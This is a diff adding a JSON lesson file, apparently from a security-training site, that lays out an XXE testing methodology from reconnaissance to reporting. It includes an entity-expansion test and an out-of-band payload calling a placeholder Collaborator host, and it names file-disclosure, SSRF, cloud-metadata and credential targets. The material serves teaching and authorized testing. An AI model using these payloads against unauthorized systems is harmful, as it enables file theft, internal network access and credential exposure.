@@ -1,0 +1,100 @@
+{
+  "id": "testing-methodology",
+  "category": "testing",
+  "title": "XXE Testing Methodology",
+  "description": "Comprehensive methodology for testing applications for XXE vulnerabilities, from reconnaissance to exploitation and reporting.",
+  "severity": "info",
+  "cvssScore": 0,
+  "cvssVector": "",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "XXE testing requires a systematic approach to identify vulnerable XML processing endpoints and validate exploitability. This methodology covers the complete testing lifecycle from initial reconnaissance to proof-of-concept and remediation validation.\n\n**Testing Objectives:**\n• Identify XML processing functionality\n• Detect XXE vulnerabilities (classic and blind)\n• Assess impact and exploitability\n• Document findings with proof-of-concept\n• Validate remediation effectiveness\n\n**Prerequisites:**\n• Understanding of XML and DTD syntax\n• Knowledge of HTTP/HTTPS protocols\n• Access to testing tools (Burp Suite, curl, etc.)\n• Controlled environment for out-of-band testing\n• Authorization to test the target system"
+    },
+    {
+      "id": "phase1-reconnaissance",
+      "title": "Phase 1: Reconnaissance",
+      "type": "text",
+      "content": "**Objective:** Identify XML processing endpoints and file upload functionality\n\n**1.1 Identify XML Endpoints**\n• API endpoints accepting Content-Type: application/xml\n• SOAP web services (WSDL endpoints)\n• REST APIs with XML support\n• Configuration file uploads\n• Document processing features\n\n**1.2 Analyze File Upload Features**\n• Look for: SVG, DOCX, XLSX, PPTX, ODT uploads\n• Check: RSS/Atom feed processors\n• Find: Import/export functionality using XML\n• Test: Document conversion services\n\n**1.3 Review Application Behavior**\n• Observe response times (slow = potential processing)\n• Check error messages for XML parser details\n• Look for XML in responses\n• Monitor network traffic for XML patterns\n\n**1.4 Technology Stack Analysis**\n• Identify server technology (headers, error pages)\n• Determine likely XML libraries based on stack\n• Check documentation for XML features\n• Review client-side code for XML usage"
+    },
+    {
+      "id": "phase2-detection",
+      "title": "Phase 2: Detection Testing",
+      "type": "text",
+      "content": "**Objective:** Determine if XML parsing occurs and if it's vulnerable to XXE\n\n**2.1 Basic XML Validation**\nTest if endpoint accepts and processes XML:\n• Send valid XML with custom elements\n• Check if application parses and responds\n• Verify XML is actually processed (not just stored)\n\n**2.2 DOCTYPE Injection Test**\nAttempt to inject DOCTYPE declaration:\n• Submit XML with <!DOCTYPE> tag\n• Observe if parser accepts DTD\n• Check for error messages or changes in behavior\n• Note: Some parsers reject DOCTYPE but still process XML\n\n**2.3 Entity Reference Test**\nTest if entities are expanded:\n• Define internal entity, reference in content\n• Check if entity value appears in response\n• Try predefined entities (&lt; &gt; &amp;)\n• Test character references (&#65;)"
+    },
+    {
+      "id": "basic-detection-payload",
+      "title": "Basic Detection Payload",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Phase 2.3: Basic entity expansion test -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY test \"ENTITY_EXPANSION_SUCCESSFUL\">\n]>\n<root>\n  <data>&test;</data>\n</root>\n\n<!-- If response contains \"ENTITY_EXPANSION_SUCCESSFUL\",\n     entities are being expanded -->\n<!-- If not in response, may be blind XXE or no expansion -->",
+        "isVulnerable": true,
+        "filename": "detection-test.xml"
+      }
+    },
+    {
+      "id": "phase3-exploitation",
+      "title": "Phase 3: Exploitation Testing",
+      "type": "text",
+      "content": "**Objective:** Confirm vulnerability and assess impact\n\n**3.1 Classic XXE Testing (Direct Output)**\n\n**Test 1: Local File Disclosure**\n• Target: /etc/hostname, /etc/issue (safe to read)\n• Payload: External entity with file:// URI\n• Verify: File content appears in response\n• Document: Exact file retrieved\n\n**Test 2: Directory Listing Attempt**\n• Try: file:/// (root directory)\n• Note: Most parsers can't list directories\n• Useful: Confirms path traversal capability\n\n**Test 3: Internal Network Access (SSRF)**\n• Target: http://localhost:80\n• Try: Common internal IPs (192.168.1.1, 10.0.0.1)\n• Check: Cloud metadata (169.254.169.254)\n• Document: Accessible internal resources\n\n**3.2 Blind XXE Testing (No Direct Output)**\n\n**Test 1: Out-of-Band Detection**\n• Setup: Burp Collaborator or interactsh.com\n• Payload: External entity to your server\n• Monitor: Incoming HTTP/DNS requests\n• Confirm: Request received = vulnerability exists\n\n**Test 2: Error-Based Detection**\n• Payload: Invalid file path in entity\n• Check: Error message contains path/file info\n• Useful: When OOB blocked but errors visible\n\n**Test 3: Time-Based Detection**\n• Payload: Reference to slow-responding server\n• Measure: Response time increase\n• Limitation: Not definitive proof"
+    },
+    {
+      "id": "oob-detection-payload",
+      "title": "Out-of-Band Detection Payload",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Blind XXE detection using Burp Collaborator -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://YOUR-COLLABORATOR-ID.burpcollaborator.net/xxe\">\n  %remote;\n]>\n<root>\n  <data>test</data>\n</root>\n\n<!-- Alternative: Use your own server -->\n<!-- Monitor access logs for incoming request -->\n<!-- Request received = XXE vulnerability confirmed -->",
+        "isVulnerable": true,
+        "filename": "oob-detection.xml"
+      }
+    },
+    {
+      "id": "phase4-impact-assessment",
+      "title": "Phase 4: Impact Assessment",
+      "type": "text",
+      "content": "**Objective:** Determine severity and business impact\n\n**4.1 Data Exposure Assessment**\n• What files can be read?\n• Can sensitive configs be accessed? (.env, web.config)\n• Can source code be retrieved?\n• Can private keys be accessed? (~/.ssh/id_rsa)\n• Can database credentials be obtained?\n\n**4.2 Network Access Assessment**\n• Which internal services are accessible?\n• Can cloud metadata be reached? (AWS, GCP, Azure)\n• Can internal APIs be accessed?\n• Can admin panels be reached?\n• What protocols work? (http, https, ftp, file)\n\n**4.3 Denial of Service Assessment**\n• Test billion laughs (carefully, in safe environment)\n• Check entity expansion limits\n• Assess resource consumption\n• Document DoS potential\n\n**4.4 Privilege Escalation Potential**\n• Can XXE lead to RCE? (expect:// wrapper, jar:// attacks)\n• Can credentials be obtained for escalation?\n• Can session tokens be accessed?\n• Can admin functionality be reached?"
+    },
+    {
+      "id": "phase5-documentation",
+      "title": "Phase 5: Documentation & Reporting",
+      "type": "text",
+      "content": "**Objective:** Create comprehensive vulnerability report\n\n**5.1 Vulnerability Details**\n• Affected endpoint/functionality\n• XML parser/library (if identified)\n• Vulnerability type (classic XXE, blind XXE, both)\n• Exploitation complexity (low/medium/high)\n• Authentication required? (yes/no)\n\n**5.2 Proof of Concept**\n• Full HTTP request showing exploitation\n• Response demonstrating impact\n• Screenshots of sensitive data accessed\n• Steps to reproduce (detailed)\n• curl/wget commands for reproduction\n\n**5.3 Impact Statement**\n• CVSS score and vector\n• Business impact description\n• Data at risk\n• Systems compromised\n• Compliance implications (PCI-DSS, GDPR, etc.)\n\n**5.4 Remediation Recommendations**\n• Immediate: Disable external entity loading\n• Short-term: Input validation, content-type checks\n• Long-term: Replace vulnerable libraries, implement WAF\n• Provide code examples for fixes\n• Reference language-specific prevention guides"
+    },
+    {
+      "id": "testing-checklist",
+      "title": "Testing Checklist",
+      "type": "text",
+      "content": "**Pre-Testing**\n☐ Authorization obtained (written permission)\n☐ Scope defined (in-scope endpoints)\n☐ Testing environment prepared (OOB server/Collaborator)\n☐ Tools configured (Burp Suite, curl, etc.)\n☐ Backup/restore plan (if testing production)\n\n**Reconnaissance**\n☐ XML endpoints identified\n☐ File upload functionality mapped\n☐ Technology stack analyzed\n☐ API documentation reviewed\n\n**Detection**\n☐ XML parsing confirmed\n☐ DOCTYPE acceptance tested\n☐ Entity expansion tested\n☐ Internal entity test performed\n☐ External entity attempted\n\n**Exploitation**\n☐ Classic XXE tested (if entities expand)\n☐ Blind XXE tested (OOB callbacks)\n☐ Error-based tested (if errors visible)\n☐ File disclosure attempted\n☐ SSRF attempted\n☐ DoS potential assessed\n\n**Documentation**\n☐ All findings documented\n☐ Proof-of-concept created\n☐ Impact assessed (CVSS scored)\n☐ Screenshots captured\n☐ Remediation steps provided\n\n**Validation**\n☐ Fixes verified after remediation\n☐ Regression testing performed\n☐ Security controls validated\n☐ Final report delivered"
+    },
+    {
+      "id": "tools",
+      "title": "Recommended Tools",
+      "type": "text",
+      "content": "**Proxy/Testing Tools:**\n• **Burp Suite Professional** - Collaborator for OOB, Scanner for automation\n• **OWASP ZAP** - Free alternative with XXE scanning\n• **curl** - Command-line testing\n• **Postman** - API testing and documentation\n\n**OOB Detection:**\n• **Burp Collaborator** - Built into Burp Suite Pro\n• **interactsh.com** - Free OOB detection service\n• **Custom server** - Python SimpleHTTPServer, netcat\n• **DNS logger** - Capture DNS queries\n\n**Payload Generators:**\n• **XXEinjector** - Automated XXE exploitation\n• **Custom scripts** - Python/Ruby payload generators\n• **Burp Intruder** - Payload iteration\n\n**Analysis Tools:**\n• **Wireshark** - Network traffic analysis\n• **tcpdump** - Packet capture\n• **Browser DevTools** - Frontend XML inspection"
+    },
+    {
+      "id": "safe-testing-practices",
+      "title": "Safe Testing Practices",
+      "type": "text",
+      "content": "**Always:**\n• Obtain written authorization before testing\n• Test in non-production when possible\n• Use safe test files (/etc/hostname, not /etc/shadow)\n• Monitor resource usage during DoS testing\n• Document all actions taken\n• Respect rate limits and throttling\n\n**Never:**\n• Test production without authorization and backup\n• Attempt to access files you don't need to prove the issue\n• Perform DoS attacks without explicit permission\n• Exfiltrate real sensitive data\n• Modify system files\n• Share vulnerabilities publicly before remediation\n\n**Best Practices:**\n• Start with least invasive tests\n• Escalate testing based on findings\n• Stop testing if causing issues\n• Communicate findings immediately if critical\n• Provide remediation support\n• Retest after fixes applied"
+    }
+  ],
+  "relatedTopics": ["classic-xxe", "blind-xxe", "payload-design", "testing-tools"],
+  "references": [
+    {
+      "title": "OWASP Testing Guide - XXE",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection"
+    },
+    {
+      "title": "PortSwigger XXE Tutorial",
+      "url": "https://portswigger.net/web-security/xxe"
+    }
+  ]
+}
